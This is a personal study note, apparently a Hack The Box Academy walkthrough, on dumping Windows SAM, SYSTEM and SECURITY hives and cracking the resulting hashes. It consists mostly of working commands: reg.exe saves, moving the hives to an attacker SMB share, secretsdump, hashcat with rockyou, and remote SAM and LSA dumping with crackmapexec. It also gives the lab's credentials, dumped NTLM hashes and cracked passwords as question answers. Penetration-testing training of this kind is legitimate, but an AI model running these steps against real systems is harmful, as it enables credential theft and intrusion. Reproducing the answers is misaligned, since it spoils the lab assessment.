### Copying SAM Registry Hives

| Registry Hive   | Description                                                                                                                                                |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `hklm\sam`      | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
| `hklm\system`   | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.                              |
| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.                                        |

#### Copy Registry Hives via reg.exe

```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

>[! Note ] 
> Use Impacket's smbserver.py to move the hive copies to a share created on the attack host


###### Syntax for smbserver.py
```python
impacket-smbserver -smb2support Name_of_Share /path/to/share/on/attack/host
```

When share is running on attack host, use the `move` command on Windows to move the hive copies to the share
```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
1 file(s) moved.
```

### Dumping Hashes with Impackets secretsdump.py

Ensure to specify each hive file you've retrieved
```python
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

>[! Warning] secretsdump cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database

### Cracking Hashes via Hashcat

tags: #hashcat

The `-m` flag cracks NT hashes (NTLM based hashes). Verify at [hashcat's wiki](https://hashcat.net/wiki/doku.php?id=example_hashes)
```go
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

### Remote Dumping and LSA Secrets Considerations

You can also extract LSA Secrets over the network i.e., from a running service, scheduled task or application that uses LSA secrets to store passwords

**Dumping LSA Secrets Remotely**
```go
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

**Dumping SAM Remotely**
```go
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

## Questions

IP
```go
10.129.3.177
```

User
```
Bob
```

Password
```
HTB_@cademy_stdnt!
```

SSH
```go
ssh Bob@STMIP
```


Question 1: Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

```go
xfreerdp /v:10.129.3.177 /u:Bob /p:HTB_@cademy_stdnt! /cert:ignore
```

First, dump the SAM database
```go
crackmapexec smb 10.129.3.177 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

Found 8 hashes!

| Username/Account   | Hash                                                                      |
| ------------------ | ------------------------------------------------------------------------- |
| Administrator      | 500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  |
| Guest              | 501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  |
| DefaultAccount     | 503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  |
| WDAGUtilityAccount | 04:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::   |
| bob                | 1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6::: |
| jason              | 1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc::: |
| ITbackdoor         | 1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321::: |
| frontdesk          | 1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71::: |

Put the hashes in a text file and crack them with Hashcat

```go
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Cracked passwords as listed:
```go
a3ecf31e65208382e23b3420a34208fc:mommy1                   
c02478537b9727d391bc80011c2e2321:matrix                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123 
```

Question 3: Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```go
crackmapexec smb 10.129.3.177 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

![[attacking_sam_q3.png]]
